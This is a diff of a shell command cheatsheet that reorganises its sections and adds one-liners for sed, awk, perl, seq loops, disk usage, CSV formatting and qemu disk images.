@@ -56,6 +56,7 @@ PROCESSES, DAEMONS AND ADMINISTRATION
 ($) Send interrupt to process: `kill -2 process_id`
 ($) Immediately terminate a process: `kill -9 process_id`
 ($) Hang up all processes that match a name: `pkill -9 "process_name"`
+($) Close virtual terminal or logout, keeping all subprocess running: `disown -a && exit`
 
 ($) Show systemctl failed units: `systemctl --failed`
 ($) Show the status of a unit: `systemctl status NAMEOFUNIT`
@@ -69,12 +70,13 @@ PROCESSES, DAEMONS AND ADMINISTRATION
 ($) Find which config-file is read: `strace 2>&1  geany | grep geany.conf`
 ($) Linux system calls of MySQL process: `strace -c -p $(pidof -s mysqld) -f -e trace=all`
 
-($) Using a single sudo to run multiple && arguments: `sudo -s <<< 'apt update -y && apt upgrade -y'`
-($) Using a single sudo to run multiple && arguments: `sudo sh -c 'apt update -y && apt upgrade -y'`
+(#) Using a single sudo to run multiple && arguments: `sudo -s <<< 'apt update -y && apt upgrade -y'`
+(#) Using a single sudo to run multiple && arguments: `sudo sh -c 'apt update -y && apt upgrade -y'`
 
-($) Change a user's name: `usermod -l newname user`
-($) Add user to supplementary groups (mind the whitespace): `usermod -a -G group1,group2 user`
-($) Create a new home directory for a user and move their files to it: `usermod -m -d path/to/home user`
+(#) Change a user's password: `passwd username`
+(#) Change a user's name: `usermod -l newname user`
+(#) Add user to supplementary groups (mind the whitespace): `usermod -a -G group1,group2 user`
+(#) Create a new home directory for a user and move their files to it: `usermod -m -d path/to/home user`
 
 FILESYSTEMS
 ===========
@@ -90,8 +92,8 @@ FILESYSTEMS
 (#) Mount an ISO: `mount -o loop /path/to/image.iso /media/mountpoint`
 (#) Rip an ISO: run `isosize -x /dev/sr0` to determine sector count and size, then run `dd if=/dev/sr0 of=discimage.iso bs=SECTOR_SIZE count=SECTOR_COUNT status=progress`
 
-STORAGE
-=======
+LISTS AND STORAGE
+=================
 ($) List permissions and ownership of contents of directory: `ls -l`
 ($) List hidden files, too, in a column: `ls -lA`
 ($) List all subdirectories (but omit . and ..): `ls -A1D`
@@ -99,15 +101,19 @@ STORAGE
 
 ($) Summarize the size of current directory on disk in a human-readable format: `du -sh`
 ($) See free disk space and mount points in a human readable format: `df -h`
+($) Get partitions that are over 50% usage: `df -h | awk '{a=$5;gsub(/%/,"",a);if(a > 50){print $0}}'`
 ($) Currently mounted filesystems in nice layout: `mount | column -t`
 ($) Get the top 10 largest files ordered by size descending, starting from the current folder, recursively: `find . -printf '%s %p\n'| sort -nr | head -10`
 ($) Find 10 largest folders: `du -hsx * | sort -rh | head -10`
-($) Watches every second, a directory listing as it changes: ``
+($) List the size (in human readable form) of all sub folders from the current location: `du -h -d1`
+($) Du command without showing other mounted file systems: `du -h --max-depth=1 --one-file-system /`
+($) Get total of inodes of root partition: `du --total --inodes / | egrep 'total$'`
 
 ($) Find top 10 largest files in /var directory (subdirectories and hidden files included ): `tree -ihafF /var | tr '[]' ' '| sort -k1hr|head -10`
 ($) Show permissions and ownership of directories to two levels: `tree -dpug -L 2`
 ($) Show directory structure to two levels with file size: `tree -ash -L 2`
 
+($) Change to previous directory: `cd -`
 ($) Create multiple subfolders in one command.: `mkdir -p /path/folder{1..4}`
 ($) Create multiple subfolders in one command.: `mkdir -p /path/{folder1,folder2,folder3,folder4}`
 
@@ -137,6 +143,7 @@ GREP
 ($) Search for an exact string (disables regular expressions): `grep -F "exact_string" path/to/file`
 ($) Use Perl regex to find the first occurence of 'K' and every character thereafter: `grep -Po '^(.*?:\K)?.*'`
 ($) Colorize grep output: `grep --color -E 'pattern|$' file`
+($) Colorize sequences of digits: `echo abcd89efghij340.20kl | grep --color -e "[0-9]\+" -e "$"`
 ($) Extract email addresses from file.txt: `grep -Eio '([[:alnum:]_.-]{1,64}@[[:alnum:]_.-]{1,252}?\.[[:alpha:].]{2,6})' file.txt`
 
 HEADS AND TAILS
@@ -167,6 +174,7 @@ CUT, TR, AND COLUMN
 ($) Cut out the fifth field of each line, using a colon as a field delimiter (default delimiter is tab): `cut -d':' -f5`
 ($) Cut out the 2nd and 10th fields of each line, using a semicolon as a delimiter: `cut -d';' -f2,10`
 ($) Cut out the fields 3 through to the end of each line, using a space as a delimiter: `cut -d' ' -f3-`
+($) Extract column from csv file: `cut -d"," -f9`
 
 ($) Replace all occurrences of a character in a file, and print the result: `tr find_character replace_character < filename`
 ($) Replace all occurrences of a character from another command's output: `echo text | tr find_character replace_character`
@@ -180,6 +188,16 @@ CUT, TR, AND COLUMN
 ($) Split columns automatically and auto-align them in a tabular format: `printf "header1 header2\nbar foo\n" | column --table`
 ($) Specify the column delimiter character for the `--table` option (e.g. "," for CSV) (defaults to whitespace): `printf "header1,header2\nbar,foo\n" | column --table --separator ,`
 ($) Fill rows before filling columns: `printf "header1\nbar\nfoobar\n" | column --output-width 30 --fillrows`
+($) Nicely format a CSV file: `column -s, -t < somefile.csv | less -#2 -N -S`
+
+SEQUENCES AND LOOPS
+===================
+($) Shell bash iterate number range with for loop: `seq 10 20`
+($) Generate a sequence of numbers.: `seq 12`
+($) Generate a sequence of numbers.: `for ((i=1; i<=99; ++i)); do echo $i; done`
+($) Shell bash iterate number range with for loop: `for((i=1;i<=10;i++)){ echo $i; }`
+($) Iterate over a number range: `for i in $(seq 1 5) ; do echo $i ; done`
+($) Iterate over a number range: `for i in {1..10}; do echo $i; done`
 
 FIND
 ====
@@ -221,6 +239,96 @@ FIND
 ($) Find directory with most inodes/files: `find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n | tail`
 ($) Count the total amount of hours of your music collection: `find . -print0 | xargs -0 -P 40 -n 1 sh -c 'ffmpeg -i "$1" 2>&1 | grep "Duration:" | cut -d " " -f 4 | sed "s/.$//" | tr "." ":"' - | awk -F ':' '{ sum1+=$1; sum2+=$2; sum3+=$3; sum4+=$4 } END { printf "%.0f:%.0f:%.0f.%.0f\n", sum1, sum2, sum3, sum4 }'`
 ($) Find all file extension in current dir.: `find . -type f | perl -ne 'print $1 if m/\.([^.\/]+)$/' | sort -u`
+
+SED
+===
+($) Replace the first occurrence of a regular expression in each line of a file, and print the result: `sed 's/regex/replace/' filename`
+($) Replace all occurrences of an extended regular expression in a file, and print the result: `sed -r 's/regex/replace/g' filename`
+($) Replace all occurrences of a string in a file, overwriting the file (i.e. in-place): `sed -i 's/find/replace/g' filename`
+($) Replace only on lines matching the line pattern: `sed '/line_pattern/s/find/replace/' filename`
+($) Delete lines matching the line pattern: `sed '/line_pattern/d' filename`
+($) Print the first 11 lines of a file: `sed 11q filename`
+($) Apply multiple find-replace expressions to a file: `sed -e 's/find/replace/' -e 's/find/replace/' filename`
+($) Replace separator `/` by any other character not used in the find or replace patterns, e.g., `#`: `sed 's#find#replace#' filename`
+($) Replace strings in text: `sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list`
+($) This will allow you to browse web sites using "-dump" with elinks while you still are logged in: `sed -i 's/show_formhist = 1/show_formhist = 0/;s/confirm_submit = 0/confirm_submit = 1/g' /etc/elinks/elinks.conf; elinks -dump https://facebook.com`
+($) Get line number 12 from a file (n supresses lines not matching): `sed -n '12p' file`
+($) Print a specific range of lines (n supresses lines not matching): `sed -n '7,24 p' file`
+($) Remove abstracts from a bibtex file: `sed '/^\s*abstract\s*=\s*{[^\n]*},$/ d' input.bib > output.bib`
+($) Delete at start of each line until character: `sed 's/^[^:]*://g'`
+($) Remove all matches containing a string until its next space: `sed 's/linux-[^ ]* \{0,1\}//g' /path/to/file`
+($) Remove ^M characters from file using sed: `sed 's/\r//g' < input.txt >  output.txt`
+($) Replace all backward slashes with forward slashes: `echo 'C:\Windows\' | sed 's|\\|\/|g'`
+($) Print one line: `sed -n '10p' myfile.txt`
+($) Do replacement on all lines except line 5: `sed '5!/s/foo/bar/' file.txt`
+($) Do replacement on lines matching regex (eg: lines starting with 'hello'): `sed '/^hello/ s/h/H/' file.txt `
+($) Do replacement from line 5 to end of file: `sed '5,$ s/foo/bar/' file.txt `
+($) Delete empty files: `sed  '/^$/d' file`
+($) Print lines between two regex matches: `sed -nE '/^foo/,/^bar/p' file.txt`
+($) Use custom delimiters to make it easy for some strings that contain slashes: `sed 's_/bin/bash_/bin/sh_' file.txt `
+($) Custom delimiters for regex address combined with the classical delimiter for substitute command (you could also use there a custom delimiter). Useful for paths.: `sed '\_/bin/bash_s/grep/egrep/' file.txt`
+($) Insert a space between lowercase/Uppercase characters using & (which represents the regex match): `sed 's/[a-zA-Z]/& /g' file.txt `
+($) Keep the first word of every line (where word is defined by alphanumeric chars + underscores for simplicity sake): `sed -E 's_[a-zA-Z0-9_]+.*_\1_' file.txt `
+($) Switch the first two words : `sed -E 's_([a-zA-Z0-9_]*) ([a-zA-Z0-9_]*)_\2 \1_' f1`
+($) Remove duplicate words separated by a single space (but not triplicate): `sed -E 's_([a-zA-Z0-9_]+) \1_\1_ig' f1`
+($) Search and replace for pattern, write just the lines with the replacements in a new file: `sed  's_foo_bar_w replaced.txt' file.txt  `
+($) Multiple replacements: `sed -e 's_foo_bar_' -e 's_hello_HELLO_' file.txt `
+($) Multiple commands using the ; operator which in theory concatenates commands: `sed '10p;5i\"INSERTED BEFORE LINE 5" file.txt `
+($) Remove comments between lines starting with these two keywords. Empty lines will be put there instead: `sed -E '/start/,/end/ s/#.*//' file.txt `
+($) Delete comments starting with # (no empty lines left behind): `sed -E '/^#/d' f1`
+($) Insert an empty line after pattern  (after each line containing comment in this case): `sed '/^#/G' file.txt `
+($) View lines minus lines between line starting with pattern and end of file : `sed  '/start/,$ d' file.txt `
+($) View lines except lines between line starting with pattern and line ending with pattern: `sed -rn '/start/,/end/ !p' file.txt `
+($) Print until you encounter pattern then quit: `sed  '/start/q' file.txt `
+($) Insert contents of file after a certain line: `sed  '5 r newfile.txt' file.txt `
+($) Append text after lines containing regex (AFTER FOO): `sed '/foo/a\AFTER FOO' file.txt `
+($) Insert text after lines containing regex (BEFORE FOO): `sed '/foo/i\BEFORE FOO' file.txt `
+($) Change line containing regex match: `sed '/foo/c\FOO IS CHANGED' file.txt `
+($) Transform text: `sed 'y/abc/ABC/' file.txt `
+($) Copy all the comments (starting with #) to a new file: `sed -E '/^#/w comments.txt' file.txt `
+($) Print every second line (substitute ~3 for third line, etc): `sed -n '1~2p' file.txt `
+($) Edit file in place but also create a backup: `sed -i.bak 's/hello/HELLO/' file.txt `
+($) Append two extra lines after regex match: `sed -E '/^#/G G' file.txt `
+
+DIFF AND COMM
+=============
+($) Comparison between the execution output of the last and penultimate command: `diff <(!!) <(!-2)`
+($) Show the difference: `diff file1 file2 --side-by-side --suppress-common-lines`
+($) Compare mysql db schema from two different servers: `diff <(mysqldump -hsystem db_name --no-data --routines) <(mysqldump -hsystem2 db_name --no-data --routines) --side-by-side --suppress-common-lines --width=690 | more`
+($) Check difference between two file directories recursively: `diff <(tree /dir/one) <(tree /dir/two)`
+
+($) Produce three tab-separated columns: lines only in first file, lines only in second file and common lines: `comm file1 file2`
+($) Print only lines common to both files: `comm -12 file1 file2`
+($) Print only lines common to both files, reading one file from `stdin`: `cat file1 | comm -12 - file2`
+($) Get lines only found in first file, saving the result to a third file: `comm -23 file1 file2 > file1_only`
+($) Print lines only found in second file, when the files aren't sorted: `comm -13 <(sort file1) <(sort file2)`
+
+AWK
+===
+($) Print the fifth column (a.k.a. field) in a space-separated file: `awk '{print $5}' filename`
+($) Print the second column of the lines containing "foo" in a space-separated file: `awk '/foo/ {print $2}' filename`
+($) Print the last column of each line in a file, using a comma (instead of space) as a field separator: `awk -F ',' '{print $NF}' filename`
+($) Sum the values in the first column of a file and print the total: `awk '{s+=$1} END {print s}' filename`
+($) Print every third line starting from the first line: `awk 'NR%3==1' filename`
+($) Print different values based on conditions: `awk '{if ($1 == "foo") print "Exact match foo"; else if ($1 ~ "bar") print "Partial match bar"; else print "Baz"}' filename`
+($) Print all lines where the 10th column value equals the specified value : `awk '($10 == value)' filename`
+($) Print all the lines which the 10th column value is between a min and a max : `awk '($10 >= min_value && $10 <= max_value)'`
+($) Print lines in a text file with numbers in first column higher or equal than a value: `awk '$NF >= 134000000 {print $0}' single-column-numbers.txt`
+($) AWK calculator: `calc(){ awk "BEGIN{ print $* }" ;}; calc "((3+(2^3)) * 34^2 / 9)-75.89"`
+
+PERL
+====
+($) Parse and execute a Perl script: `perl script.pl`
+($) Check syntax errors on a Perl script: `perl -c script.pl`
+($) Parse and execute a Perl statement: `perl -e perl_statement`
+($) Run a Perl script in debug mode, using `perldebug`: `perl -d script.pl`
+($) Loo[p] over all lines of a file, editing them [i]n-place using a find/replace [e]xpression: `perl -p -i -e 's/find/replace/g' filename`
+($) Run a find/replace expression on a file, saving the original file with a given extension: `perl -p -i'.old' -e 's/find/replace/g' filename`
+($) Run a multiline find/replace expression on a file, and save the result in another file: `perl -p0e 's/foo\nbar/foobar/g' input_file > output_file`
+($) Run a regular expression on stdin, printing out the first capture group for each line: `cat path/to/input_file | perl -nle 'if (/.*(foo).*/) {print "$1"; last;}'`
+($) Calculate the mean or average of a single column of numbers in a text file: `perl -lane '$total += $F[0]; END{print $total/$.}' single-column-numbers.txt`
+($) Shuffle lines via perl: `seq 1 9 | perl -e 'print sort { (-1,1)[rand(2)] } <>'`
+($) Shuffle lines via perl: `seq 1 9 | perl -MList::Util=shuffle -e 'print shuffle <>;'`
 
 ZIP
 ===
@@ -287,106 +395,6 @@ TAR AND COMPRESSION
 ($) Create an uncompressed tar file of each child directory of the current working directory: `find . -maxdepth 1 -mindepth 1 -type d -exec tar cvf {}.tar {}  \;`
 
 ($) Zgrep across multiple files: `find . -name "file-pattern*.gz" -exec zgrep -H 'pattern' {} \;`
-
-SED
-===
-($) Replace the first occurrence of a regular expression in each line of a file, and print the result: `sed 's/regex/replace/' filename`
-($) Replace all occurrences of an extended regular expression in a file, and print the result: `sed -r 's/regex/replace/g' filename`
-($) Replace all occurrences of a string in a file, overwriting the file (i.e. in-place): `sed -i 's/find/replace/g' filename`
-($) Replace only on lines matching the line pattern: `sed '/line_pattern/s/find/replace/' filename`
-($) Delete lines matching the line pattern: `sed '/line_pattern/d' filename`
-($) Print the first 11 lines of a file: `sed 11q filename`
-($) Apply multiple find-replace expressions to a file: `sed -e 's/find/replace/' -e 's/find/replace/' filename`
-($) Replace separator `/` by any other character not used in the find or replace patterns, e.g., `#`: `sed 's#find#replace#' filename`
-($) Replace strings in text: `sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list`
-($) This will allow you to browse web sites using "-dump" with elinks while you still are logged in: `sed -i 's/show_formhist = 1/show_formhist = 0/;s/confirm_submit = 0/confirm_submit = 1/g' /etc/elinks/elinks.conf; elinks -dump https://facebook.com`
-($) Get line number 12 from a file (n supresses lines not matching): `sed -n '12p' file`
-($) Print a specific range of lines (n supresses lines not matching): `sed -n '7,24 p' file`
-($) Remove abstracts from a bibtex file: `sed '/^\s*abstract\s*=\s*{[^\n]*},$/ d' input.bib > output.bib`
-($) Delete at start of each line until character: `sed 's/^[^:]*://g'`
-($) Remove all matches containing a string until its next space: `sed 's/linux-[^ ]* \{0,1\}//g' /path/to/file`
-($) Remove ^M characters from file using sed: `sed 's/\r//g' < input.txt >  output.txt`
-($) Replace all backward slashes with forward slashes: `echo 'C:\Windows\' | sed 's|\\|\/|g'`
-($) Print one line: `sed -n '10p' myfile.txt`
-($) Do replacement on all lines except line 5: `sed '5!/s/foo/bar/' file.txt`
-($) Do replacement on lines matching regex (eg: lines starting with 'hello'): `sed '/^hello/ s/h/H/' file.txt `
-($) Do replacement from line 5 to end of file: `sed '5,$ s/foo/bar/' file.txt `
-($) Delete empty files: `sed  '/^$/d' file`
-($) Print lines between two regex matches: `sed -nE '/^foo/,/^bar/p' file.txt`
-($) Use custom delimiters to make it easy for some strings that contain slashes: `sed 's_/bin/bash_/bin/sh_' file.txt `
-($) Custom delimiters for regex address combined with the classical delimiter for substitute command (you could also use there a custom delimiter). Useful for paths.: `sed '\_/bin/bash_s/grep/egrep/' file.txt`
-($) Insert a space between lowercase/Uppercase characters using & (which represents the regex match): `sed 's/[a-zA-Z]/& /g' file.txt `
-($) Keep the first word of every line (where word is defined by alphanumeric chars + underscores for simplicity sake): `sed -E 's_[a-zA-Z0-9_]+.*_\1_' file.txt `
-($) Switch the first two words : `sed -E 's_([a-zA-Z0-9_]*) ([a-zA-Z0-9_]*)_\2 \1_' f1`
-($) Remove duplicate words separated by a single space (but not triplicate): `sed -E 's_([a-zA-Z0-9_]+) \1_\1_ig' f1`
-($) Search and replace for pattern, write just the lines with the replacements in a new file: `sed  's_foo_bar_w replaced.txt' file.txt  `
-($) Multiple replacements: `sed -e 's_foo_bar_' -e 's_hello_HELLO_' file.txt `
-($) Multiple commands using the ; operator which in theory concatenates commands: `sed '10p;5i\"INSERTED BEFORE LINE 5" file.txt `
-($) Remove comments between lines starting with these two keywords. Empty lines will be put there instead: `sed -E '/start/,/end/ s/#.*//' file.txt `
-($) Delete comments starting with # (no empty lines left behind): `sed -E '/^#/d' f1`
-($) Insert an empty line after pattern  (after each line containing comment in this case): `sed '/^#/G' file.txt `
-($) View lines minus lines between line starting with pattern and end of file : `sed  '/start/,$ d' file.txt `
-($) View lines except lines between line starting with pattern and line ending with pattern: `sed -rn '/start/,/end/ !p' file.txt `
-($) Print until you encounter pattern then quit: `sed  '/start/q' file.txt `
-($) Insert contents of file after a certain line: `sed  '5 r newfile.txt' file.txt `
-($) Append text after lines containing regex (AFTER FOO): `sed '/foo/a\AFTER FOO' file.txt `
-($) Insert text after lines containing regex (BEFORE FOO): `sed '/foo/i\BEFORE FOO' file.txt `
-($) Change line containing regex match: `sed '/foo/c\FOO IS CHANGED' file.txt `
-($) Transform text: `sed 'y/abc/ABC/' file.txt `
-($) Copy all the comments (starting with #) to a new file: `sed -E '/^#/w comments.txt' file.txt `
-($) Print every second line (substitute ~3 for third line, etc): `sed -n '1~2p' file.txt `
-($) Edit file in place but also create a backup: `sed -i.bak 's/hello/HELLO/' file.txt `
-($) Append two extra lines after regex match: `sed -E '/^#/G G' file.txt `
-
-DIFF
-====
-($) Comparison between the execution output of the last and penultimate command: `diff <(!!) <(!-2)`
-($) Show the difference: `diff file1 file2 --side-by-side --suppress-common-lines`
-($) Compare mysql db schema from two different servers: `diff <(mysqldump -hsystem db_name --no-data --routines) <(mysqldump -hsystem2 db_name --no-data --routines) --side-by-side --suppress-common-lines --width=690 | more`
-($) Check difference between two file directories recursively: `diff <(tree /dir/one) <(tree /dir/two)`
-
-($) Close virtual terminal or logout, keeping all subprocess running: `disown -a && exit`
-
-AWK
-===
-($) Print the fifth column (a.k.a. field) in a space-separated file: `awk '{print $5}' filename`
-($) Print the second column of the lines containing "foo" in a space-separated file: `awk '/foo/ {print $2}' filename`
-($) Print the last column of each line in a file, using a comma (instead of space) as a field separator: `awk -F ',' '{print $NF}' filename`
-($) Sum the values in the first column of a file and print the total: `awk '{s+=$1} END {print s}' filename`
-($) Print every third line starting from the first line: `awk 'NR%3==1' filename`
-($) Print different values based on conditions: `awk '{if ($1 == "foo") print "Exact match foo"; else if ($1 ~ "bar") print "Partial match bar"; else print "Baz"}' filename`
-($) Print all lines where the 10th column value equals the specified value : `awk '($10 == value)' filename`
-($) Print all the lines which the 10th column value is between a min and a max : `awk '($10 >= min_value && $10 <= max_value)'`
-($) Print lines in a text file with numbers in first column higher or equal than a value: `awk '$NF >= 134000000 {print $0}' single-column-numbers.txt`
-($) AWK calculator: `calc(){ awk "BEGIN{ print $* }" ;}; calc "((3+(2^3)) * 34^2 / 9)-75.89"`
-
-PERL
-====
-($) Parse and execute a Perl script: `perl script.pl`
-($) Check syntax errors on a Perl script: `perl -c script.pl`
-($) Parse and execute a Perl statement: `perl -e perl_statement`
-($) Run a Perl script in debug mode, using `perldebug`: `perl -d script.pl`
-($) Loo[p] over all lines of a file, editing them [i]n-place using a find/replace [e]xpression: `perl -p -i -e 's/find/replace/g' filename`
-($) Run a find/replace expression on a file, saving the original file with a given extension: `perl -p -i'.old' -e 's/find/replace/g' filename`
-($) Run a multiline find/replace expression on a file, and save the result in another file: `perl -p0e 's/foo\nbar/foobar/g' input_file > output_file`
-($) Run a regular expression on stdin, printing out the first capture group for each line: `cat path/to/input_file | perl -nle 'if (/.*(foo).*/) {print "$1"; last;}'`
-($) Calculate the mean or average of a single column of numbers in a text file: `perl -lane '$total += $F[0]; END{print $total/$.}' single-column-numbers.txt`
-($) Shuffle lines via perl: `seq 1 9 | perl -e 'print sort { (-1,1)[rand(2)] } <>'`
-($) Shuffle lines via perl: `seq 1 9 | perl -MList::Util=shuffle -e 'print shuffle <>;'`
-
-SHELL THINGS
-============
-TODO: are these `sh`, `bash`, or others?
-($) Nicely format a CSV file: `column -s, -t < somefile.csv | less -#2 -N -S`
-($) Change all file extensions from txt to xml: `for file in *.txt; do mv "$file" "${file%.txt}.xml"; done`
-($) Silently deletes lines containing a specific string in a bunch of files: `for file in $(egrep 'abc|def' *.sql | cut -d":" -f1 | uniq); do    sed -i '/abc/d' ./$file ; sed -i '/def/d' ./$file; done`
-($) Rename all files in lower case: `for f in $(find); do mv -v "$f" "$(echo $f | tr '[A-Z]' '[a-z]')"; done`
-($) Shell bash iterate number range with for loop: `for((i=1;i<=10;i++)){ echo $i; }`
-($) Generate a sequence of numbers.: `for ((i=1; i<=99; ++i)); do echo $i; done`
-($) Iterate over a number range: `for i in $(seq 1 5) ; do echo $i ; done`
-($) Iterate over a number range: `for i in {1..10}; do echo $i; done`
-($) Get a random (uniform) integer between 1 and 100: `echo $(( ( RANDOM % 100 ) + 1))`
-($) Calculate pi to an arbitrary number of decimal places: `bc -l <<< "scale=1000; 4*a(1)"`
 
 XORG
 ====
@@ -578,8 +586,8 @@ GENERAL NETWORKING
 ($) Transfer a directory [r]ecursively, in [a]rchive to preserve attributes, resolving contained soft[l]inks , and ignoring already transferred files [u]nless newer: `rsync -rauL remote_host:path/to/remote_file path/to/local_directory`
 ($) Transfer file over SSH and delete local files that do not exist on remote host: `rsync -e ssh --delete remote_host:path/to/remote_file path/to/local_file`
 ($) Transfer file over SSH using a different port than the default and show global progress: `rsync -e 'ssh -p port' --info=progress2 remote_host:path/to/remote_file path/to/local_file`
-($) Rsync using SSH and outputing results to a text file: `rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ > /Text_file_Directory/backuplog.txt`
-($) Rsync using pem file: `rsync -e 'ssh -i /root/my.pem' -avz /mysql/db/data_summary.* ec2-1-2-4-9.compute-1.amazonaws.com:/mysql/test/`
+($) Transfer using SSH and outputing results to a text file: `rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ > /Text_file_Directory/backuplog.txt`
+($) Transfer using pem file: `rsync -e 'ssh -i /root/my.pem' -avz /mysql/db/data_summary.* ec2-1-2-4-9.compute-1.amazonaws.com:/mysql/test/`
 
 ($) Run a http server in the current directory tree (http://localhost:8080/) : `python -m http.server 8080 && $BROWSER http://localhost:8080`
 ($) Super fast port scanner: `time seq 65535 | parallel -k --joblog portscan -j9 --pipe --cat -j200% -n9000  --tagstring  '\033[30;3{=$_=++$::color%8=}m'  'nc -vz localhost $(head -n1 {})-$(tail -n1 {})'`
@@ -1137,20 +1145,31 @@ TODO (*) (Powershell) Create a new volume (`mkfs` on linux): ``
 ($) (Powershell) Get last boot time: `Get-CimInstance -ClassName win32_operatingsystem | select csname,lastbootuptime`
 ($) (Powershell) Backup with versioning: `& 'C:\cwRsync_5.5.0_x86_Free\bin\rsync.exe' --force --ignore-errors --no-perms --chmod=ugo=rwX --checksum --delete --backup --backup-dir="_EVAC/$(Get-Date -Format "yyyy-MM-dd-HH-mm-ss")" --whole-file -a -v "//MyServer/MyFolder" "/cygdrive/c/Backup"`
 
+VIRTUALIZATION
+==============
+($) Create a 4 GiB image in the raw format: `qemu-img create -f raw image_file 4G`
+($) Create a 4 GiB image in the qcow2 format: `qemu-img create -f qcow2 image_file 4G`
+($) To change (e.g. increase) image space to a raw or qcow2 image by 10 GiB, run (backup NTFS filesystems first!): `qemu-img resize disk_image +10G`
+($) Convert a raw image to qcow2: `qemu-img convert -f raw -O qcow2 input.img output.qcow2`
+($) On i386 guests, to install from a bootable ISO file as CD-ROM and a raw disk image (default 128 MB memory): `qemu-system-x86_64 -cdrom iso_image -boot menu=on -drive file=disk_image,format=raw`
+($) Boot a flash disk in QEMU to test it: `qemu-system-x86_64 -rtc base=localtime -m 2G -vga std -drive file=/dev/sdb,readonly=on,cache=none,format=raw,if=virtio`
+
 COMBOS (BOX OF CHOCOLATES EDITION)
 ==================================
-($) Shamefully scrape commandlinefu oneliners: `URL="http://www.commandlinefu.com" && wget -O - --save-cookies c $URL && for i in {0..564};do wget -w 8 --random-wait -O - --load-cookies c $URL/commands/browse/plaintext/$i >> ~/commands.txt ;done;rm -f c`
+($) Get a random (uniform) integer between 1 and 100: `echo $(( ( RANDOM % 100 ) + 1))`
+($) Calculate pi to an arbitrary number of decimal places: `bc -l <<< "scale=1000; 4*a(1)"`
 ($) Print all colours in terminal: `(x=$(tput op) y=$(printf %76s);for i in {0..256};do o=00$i;echo -e ${o:${#o}-3:3} $(tput setaf $i;tput setab $i)${y// /=}$x;done)`
-($) Console clock: `while sleep 1; do     tput sc;     tput cup 0 $(($(tput cols)-29));     date;     tput rc; done &`
-($) Shuffle lines via bash: `seq 1 9 | sort -R`
-($) Shell bash iterate number range with for loop: `seq 10 20`
-($) Generate a sequence of numbers.: `seq 12`
 ($) Remove ANSI colour escape codes from a file: `sed 's/\x1b\[[0-9;]*m//g'`
-($) Output the final destination of a URL: `curl -Ls -o /dev/null -w %{url_effective} https://startingurlgoeshere`
+
+($) Change all file extensions from txt to xml: `for file in *.txt; do mv "$file" "${file%.txt}.xml"; done`
+($) Silently deletes lines containing a specific string in a bunch of files: `for file in $(egrep 'abc|def' *.sql | cut -d":" -f1 | uniq); do    sed -i '/abc/d' ./$file ; sed -i '/def/d' ./$file; done`
+($) Rename all files in lower case: `for f in $(find); do mv -v "$f" "$(echo $f | tr '[A-Z]' '[a-z]')"; done`
+
+($) Console clock: `while sleep 1; do     tput sc;     tput cup 0 $(($(tput cols)-29));     date;     tput rc; done &`
+($) Shamefully scrape commandlinefu oneliners: `URL="http://www.commandlinefu.com" && wget -O - --save-cookies c $URL && for i in {0..564};do wget -w 8 --random-wait -O - --load-cookies c $URL/commands/browse/plaintext/$i >> ~/commands.txt ;done;rm -f c`
 ($) List top 100 djs from https://djmag.com/top100djs: `lynx -listonly -nonumbers -dump https://djmag.com/top100djs|sed '1d'|cut -d- -f5,6,7|sed -n '180,$p'|nl --number-format=rn --number-width=3|sed 's/-/ /g'|sed -e 's/.*/\L&/' -e 's/\<./\u&/g'`
 ($) lynx - Get a text-only version of a website: `lynx -dump -dont_wrap_pre "URL" >> dump.txt`
 ($) sxiv - Search directory for files and run them as a slideshow: `sxiv -S 2 -i <<< $(find . -type f)`
-($) Boot a flash disk in QEMU to test it: `qemu-system-x86_64 -rtc base=localtime -m 2G -vga std -drive file=/dev/sdb,readonly=on,cache=none,format=raw,if=virtio`
 ($) Convert JSON to YAML: `yq . -y <example.json`
 ($) From all PDF files in all subdirectories, extract two metadata fields (here: Creator and Producer) into a CSV table: `echo "File;Creator;Producer";find . -name '*.pdf' -print0 | while IFS= read -d $'\0' line;do echo -n "$line;";pdfinfo "$line" | perl -ne 'if(/^(Creator|Producer):\s*(.*)$/){print"$2";if ($1 eq "Producer"){exit}else{print";"}}';echo;done 2>/dev/null`
 ($) Fetch current outside temperature at location bc-32 (Canada, see weather.gc.ca): `curl -s https://weather.gc.ca/rss/city/bc-32.xml | grep -oP '(?<=Current Conditions: )\d{1,}\.\d{1,}'`
@@ -1167,9 +1186,7 @@ COMBOS (BOX OF CHOCOLATES EDITION)
 ($) Recall Nth command from your BASH history without executing it.: `!12:p`
 ($) Learn the difference between single and double quotes: `a=7; echo $a; echo "$a"; echo '$a'; echo "'$a'"; echo '"$a"'`
 ($) Bash alias to output the current Swatch Internet Time: `alias beats='echo '\''@'\''$(TZ=GMT-1 date +'\''(%-S + %-M * 60 + %-H * 3600) / 86.4'\''| bc)'`
-($) Start a game on the discrete GPU (hybrid graphics): `alias game='DRI_PRIME=1'`
 ($) Replacement of tree command (ignore node_modules): `alias tree='pwd;find . -path ./node_modules -prune -o -print | sort | sed '\''1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'\'''`
-($) Open clipboard content on vim: `alias vcb='xclip -i -selection clipboard -o | vim -'`
 ($) Faciliate the work for lftp ('all' is needed if you wanna use it with getopts, otherwise its enough with the lftp line): `all="$(echo -e $*| awk '{for(i=3;i<=NF;++i)print $i}'|xargs)"; lftp -e open <HOSTNAME> -p <PORT> -u <USER>:<PASSWORD> -e "$all;exit"`
 ($) Change values from 0 to 100: `awk '{if ($3 =="LAN" && $5 == "0.00" ) print $1,  $2, "LAN",  "288",  "100.00"; else print $1 ,$2, $3, $4, $5 }' sla-avail-2013-Feb > sla-avail-2013-Feb_final`
 ($) Use was ec2 describe instances to retrieve IAM roles for specific ec2 tag to css list: `aws ec2 describe-instances --region us-east-1 --filters "Name=tag:YourTag,Values=YourValue" |  jq '.["Reservations"]|.[]|.Instances|.[]|.IamInstanceProfile.Arn + "," +.InstanceId'`
@@ -1189,41 +1206,28 @@ COMBOS (BOX OF CHOCOLATES EDITION)
 ($) Parse and format IP:port currently in listen state without net tools: `cat /proc/net/tcp | grep " 0A " | sed 's/^[^:]*: \(..\)\(..\)\(..\)\(..\):\(....\).*/echo $((0x\4)).$((0x\3)).$((0x\2)).$((0x\1)):$((0x\5))/g' | bash`
